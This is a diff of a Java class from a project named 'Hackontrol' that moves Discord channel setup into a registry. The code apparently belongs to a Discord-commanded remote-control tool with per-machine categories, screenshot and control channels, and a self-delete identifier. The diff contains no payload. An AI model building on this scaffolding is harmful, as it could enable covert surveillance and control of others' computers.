@@ -4,9 +4,8 @@ import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 
-import com.khopan.hackontrol.channel.ControlChannel;
-import com.khopan.hackontrol.channel.ScreenshotChannel;
 import com.khopan.hackontrol.manager.Manager;
+import com.khopan.hackontrol.registration.ChannelRegistry;
 import com.khopan.hackontrol.registration.ManagerRegistry;
 import com.khopan.hackontrol.registry.RegistrationHandler;
 import com.khopan.hackontrol.registry.Registry;
@@ -22,17 +21,18 @@ import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class Hackontrol {
 	public static final RegistryType<Void, Class<? extends Manager>> MANAGER_REGISTRY = RegistryType.create();
+	public static final RegistryType<Void, Class<? extends HackontrolChannel>> CHANNEL_REGISTRY = RegistryType.create();
 
 	public static final String DELETE_SELF_IDENTIFIER = "hackontrolSpecialDeleteSelf";
 
 	private static Hackontrol INSTANCE;
 
 	private final List<Manager> managerList;
+	private final List<HackontrolChannel> channelList;
 	private final RegistrationHandler registrationHandler;
 	private final JDA bot;
 	private final Guild guild;
 	private final Category category;
-	private final List<HackontrolChannel> channelList;
 	//private final List<ButtonHandlerEntry> handlerList;
 
 	//private Consumer<Boolean> questionCallback;
@@ -42,6 +42,9 @@ public class Hackontrol {
 		StrictClassValueOnlyRegistryImplementation<Manager> managerRegistryImplementation = StrictClassValueOnlyRegistryImplementation.create(Hackontrol.MANAGER_REGISTRY, Manager.class);
 		ManagerRegistry.register(managerRegistryImplementation);
 		this.managerList = managerRegistryImplementation.getList();
+		StrictClassValueOnlyRegistryImplementation<HackontrolChannel> channelRegistryImplementation = StrictClassValueOnlyRegistryImplementation.create(Hackontrol.CHANNEL_REGISTRY, HackontrolChannel.class);
+		ChannelRegistry.register(channelRegistryImplementation);
+		this.channelList = channelRegistryImplementation.getList();
 		this.registrationHandler = new RegistrationHandler();
 		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);
 		this.managerList.forEach(manager -> manager.configureBuilder(builder));
@@ -54,8 +57,6 @@ public class Hackontrol {
 		}
 
 		this.guild = this.bot.getGuildById(1173967259304198154L);
-		this.channelList = new ArrayList<>();
-		this.addChannel();
 		String identifier = Machine.getIdentifier();
 		this.category = DiscordUtils.getOrCreateCategory(this.guild, identifier);
 		//this.handlerList = new ArrayList<>();
@@ -73,11 +74,6 @@ public class Hackontrol {
 				hackontrolChannel.initialize();
 			}
 		}
-	}
-
-	private void addChannel() {
-		this.channelList.add(new ControlChannel());
-		this.channelList.add(new ScreenshotChannel());
 	}
 
 	/*private void registerButtonHandler(String buttonIdentifier, Consumer<ButtonInteraction> action) {
